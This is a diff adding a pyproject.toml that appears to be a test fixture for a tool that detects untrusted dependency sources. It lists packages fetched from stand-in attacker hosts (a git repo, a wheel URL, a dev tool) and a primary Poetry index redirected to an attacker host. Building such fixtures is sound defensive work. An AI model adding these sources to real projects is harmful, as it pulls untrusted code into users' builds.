@@ -1,0 +1,25 @@
+[project]
+name = "dep-bootstrap"
+version = "1.0.0"
+dependencies = [
+  "evil @ git+https://github.com/attacker/evil.git@main",
+  "art @ https://attacker.test/art-1.0-py3-none-any.whl",
+  "chalk",
+]
+
+[project.optional-dependencies]
+# A multi-line PEP 621 group array — each element parsed individually.
+dev = [
+  "tool @ git+https://github.com/attacker/tool.git",
+  "loosepkg",
+]
+
+[project.urls]
+# A metadata URL — section-aware parse must NOT read this as a dependency source.
+Homepage = "https://github.com/attacker/evil"
+
+[[tool.poetry.source]]
+# A custom Poetry package source on an attacker host — a source redirect.
+name = "evil-index"
+url = "https://poetry.attacker.test/simple/"
+priority = "primary"
